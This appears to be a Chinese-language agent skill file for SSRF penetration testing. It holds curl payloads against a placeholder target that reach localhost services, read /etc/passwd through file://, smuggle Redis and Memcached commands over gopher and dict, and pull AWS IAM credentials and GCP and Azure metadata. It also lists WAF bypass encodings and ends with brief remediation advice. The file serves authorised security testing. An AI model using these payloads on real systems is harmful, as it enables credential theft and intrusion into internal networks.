---
name: redteam-ssrf
description: "SSRF 服务端请求伪造测试 — 基础 SSRF、盲 SSRF、协议走私、云元数据访问。授权安全测试使用。"
version: 1.0.0
author: Hermes Agent (inspired by VulnClaw redteam-ssrf-detail-pack)
license: MIT
metadata:
  hermes:
    tags: [ssrf, server-side-request-forgery, cloud-metadata, protocol-smuggling]
---

# SSRF 服务端请求伪造测试

## 漏洞原理

SSRF 允许攻击者诱导服务器向任意目标发起请求，绕过网络边界访问内部资源。

## 检测方法

### 手动检测
```bash
# 基础检测
curl -s "https://TARGET/api/fetch?url=http://127.0.0.1:22"
curl -s "https://TARGET/api/fetch?url=http://169.254.169.254/latest/meta-data/"

# DNS 重绑定检测
curl -s "https://TARGET/api/fetch?url=http://attacker-controlled-domain.com"

# 协议走私
curl -s "https://TARGET/api/fetch?url=gopher://127.0.0.1:6379/_INFO"
curl -s "https://TARGET/api/fetch?url=dict://127.0.0.1:11211/stats"
curl -s "https://TARGET/api/fetch?url=file:///etc/passwd"
```

### 云元数据
```bash
# AWS
curl -s "https://TARGET/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# GCP
curl -s "https://TARGET/api/fetch?url=http://metadata.google.internal/computeMetadata/v1/"

# Azure
curl -s "https://TARGET/api/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01"
```

## WAF 绕过

- IP 格式变换：`127.0.0.1` → `127.1` / `0x7f000001` / `2130706433`
- 域名解析：`localtest.me` / `nip.io` / `sslip.io`
- URL 编码：`%31%32%37%2e%30%2e%30%2e%31`
- 重定向：短链服务 / 自建 302

## 修复建议

1. 白名单允许的协议和主机
2. 禁止内网 IP 段访问
3. 使用专用 egress 代理
4. 元数据服务加固（IMDSv2）

## 参考资源

- OWASP SSRF Prevention Cheat Sheet
- PayloadsAllTheThings SSRF
